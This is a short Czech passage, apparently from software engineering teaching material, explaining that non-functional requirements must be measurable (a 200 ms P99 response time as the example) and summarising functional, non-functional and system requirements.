Upozornění: Nefunkční požadavky musí být měřitelné. „Systém bude rychlý" je špatný požadavek. „Odpoví do 200 ms pro P99" je dobrý. Neměřitelné požadavky nelze ověřit ani testovat.
Shrnutí:
  • Funkční: co systém dělá (use cases, features).
  • Nefunkční: jak dobře to dělá (výkon, bezpečnost, škálovatelnost).
  • Systémové: v jakých mezích pracuje (platforma, integrace, legislativa).
  • Nefunkční požadavky musí být měřitelné.
